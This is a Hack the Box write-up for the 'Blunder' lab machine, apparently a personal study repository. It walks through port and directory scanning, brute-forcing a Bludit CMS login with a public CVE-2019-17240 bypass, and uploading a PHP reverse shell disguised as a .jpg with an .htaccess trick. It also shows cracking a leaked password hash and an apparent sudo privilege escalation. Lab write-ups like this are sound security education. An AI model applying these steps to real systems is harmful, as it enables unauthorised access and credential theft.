# Hack the Box - Blunder

# Reconnaissance

## NMAP
```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.191 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.191
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
Device type: general purpose|storage-misc|WAP
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X|3.X (98%), HP embedded (91%), Ubiquiti AirOS 5.X (89%), Ubiquiti embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:ubnt:airos:5.2.6 cpe:/h:ubnt:airmax_nanostation
Aggressive OS guesses: Linux 5.0 (98%), Linux 5.4 (93%), Linux 5.0 - 5.4 (93%), HP P2000 G3 NAS device (91%), Linux 4.15 - 5.6 (91%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Linux 5.1 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.49 seconds
```

```CSS
▶ nmap -sC -sV -p 21,80 10.10.10.191 -oN services.nmap

Nmap scan report for 10.10.10.191
Host is up (0.18s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

---

## HTTP 80
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f70628d0-2b79-45bb-af4e-e683b063aa20)

---

## Content Discovery

```CSS
▶ gobuster dir --url http://10.10.10.191 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --threads 20
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4075b582-c7ff-44a4-8767-fe978f218cc9)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ae1ef991-a735-481f-ac4e-fbac773d364d)
  - `Bludit` admin login.

```CSS
▶ gobuster dir --url http://10.10.10.191 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --threads 20
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c1979746-2805-426a-9824-c5f46d09a09b)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/3fe67c23-2588-4b30-82d4-0038d697ee17)
  - Probably the CMS is running an older version.
  - Potential username `fergus`.

---

## Brute-Force Credentials
  - A potential username `fergus` is found. Attempt to brute-force the password of this user for the CMS.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5486ce91-06ec-466f-b912-f9d4066152f0)
  - IP address gets banned after a few tries to brute-force the password.

### Brute-Force Mitigation Bypass
  - Search for bypassing brute-force protection.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c7a9919b-9581-433c-b2e9-8670b9fb257c)

  - Google search.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d7d3f417-9f2d-42ab-910e-7430ef76d1fb)
  - Bludit Brute-force Mitigation Bypass (CVE-2019-17240)

  - https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1b80229c-69f6-4496-975e-6bf906725572)

```CSS
▶ python exploit.py -l http://10.10.10.191/admin/login.php -u users.txt -p passwords.txt
```
  - Valid password `RolandDeschain` found for the user `fergus`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8795423e-82bb-40fe-b9d5-c0caeb7668de)

Login with the credentials to the Bludit dashboard.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/46f720ab-ae30-4bb4-a20a-f1f07d6ddf4c)

- Login successful to Dashboard.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/6fb1a617-4f08-4d12-a236-b860b18cbea5)

---

  - Search for exploits.
  - Bludit RCE - https://github.com/bludit/bludit/issues/1081


![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/190c2241-d3d6-46b8-a6aa-f0e8dfbcf2a5)

  - Upload a php reverse shell to the target machine.
```CSS
▶ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```
  - Change the IP address and Port in the shell code.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f91738d7-102a-4418-b21f-3f3eddac9b06)
  - Change the extension of the shell file from `.php` to `.jpg`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2a4f8ae9-a014-4322-bcac-c0c22263a038)

  - Upload the shell and modify the `UUID` by intercepting the upload request in burpsuite.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/dfcd390f-c71c-4994-8469-4a26e2c0d8cd)
  - Also upload the `htaccess` file to make the `jpg` executable as `php`.

Contents of `htaccess` file.
```CSS
RewriteEngine off
AddType application/x-httpd-php .jpg
```

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/dea6a20e-07fa-490d-976b-9a3217c9ac52)
  - Browse to the location of the uploaded shell.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b470b90a-15ac-4c31-b032-f7802aafd02f)
  - Start a `netcat` listener.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/53d65f09-2a0b-4c90-b6e0-1a3cfec4bc76)

Upgrade shell to TTY
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/25c44c5d-61c4-42e6-b151-c7c772da3596)

  - Uploading `linpeas.sh`
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/abaeecce-bd2b-454c-b2f8-5d4baaf153c4)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/25c2b341-5f95-4700-acf2-ca3b60184014)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bead94c5-d1c7-4bb2-a641-ff86f1d56f54)
```CSS
Username: Hugo
Password: faca404fd5c0a31cf1897b823c695c85cffeb98d
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38669c8c-0d90-416d-bac8-ba5e87c3d283)
```CSS
Cracked Password: Password120
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/bc4af429-04ab-4bb3-907e-a1cfe46b0eaf)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ce367232-cff3-49d1-8cee-1e29c348018f)

```CSS
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/b892c926-361e-4cb7-a5db-cebb5e6149c8)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/446ccef4-6779-47cc-8a9c-88a77a953e31)

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/220cf239-203f-44ab-8768-441cdb18ec03)
